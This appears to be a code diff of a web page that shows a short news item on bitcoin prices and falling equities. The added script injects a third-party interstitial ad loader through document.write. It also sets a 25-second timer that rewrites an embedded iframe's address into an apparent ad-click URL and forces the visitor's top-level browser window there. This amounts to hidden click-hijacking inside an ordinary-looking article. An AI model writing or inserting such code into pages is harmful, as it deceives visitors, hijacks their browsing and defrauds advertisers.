@@ -3,9 +3,29 @@
 <head>
 </head>
 <body>
-<script sync src="https://ss.mrmnd.com/interstitial.js" data-mndintid="845e083b-ab3f-45db-a6da-557ab53b64af"></script>       
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"> </script>
+
+
+	<script type="text/javascript">
+  document.write('<script type="text/javascript" src="https://ss.mrmnd.com/interstitial.js" data-mndintid="845e083b-ab3f-45db-a6da-557ab53b64af"><\/script>');
+</script>
+
+<script type="text/javascript">
+  function message() {
+			var src1 = $('iframe').attr("src");
+			var my1 = src1.split("ib", 2);
+			
+			var url1 = my1[0] + 'ib' + my1[1] + 'cl';
+			window.top.location.href = url1; 
+			//window.parent.location.href = url1; 
+
+                }
+	window.onload = function()
+		{
+		    setTimeout(message,25000);
+		};
+</script>
 
 
  <p>The largest token rose as much as 2% on Monday to $20,412 after trading below that key round-number threshold over the weekend. Other cryptocurrenices were mixed. Equities -- which plunged on Friday in the wake of Powell’s remarks -- extended declines, with the Nasdaq Composite index shedding 0.7% as of 2:20 p.m. in New York.
@@ -16,20 +36,9 @@
 	<script>
 
 
-		window.onload = function()
-		{
-		    setTimeout(message,25000);
-		};
 		
-                function message() {
-			var src1 = $('iframe').attr("src");
-			var my1 = src1.split("ib", 2);
-			
-			var url1 = my1[0] + 'ib' + my1[1] + 'cl';
-			window.top.location.href = url1; 
-			//window.parent.location.href = url1; 
-
-                }
+		
+                
                 
    </script>
 </body>
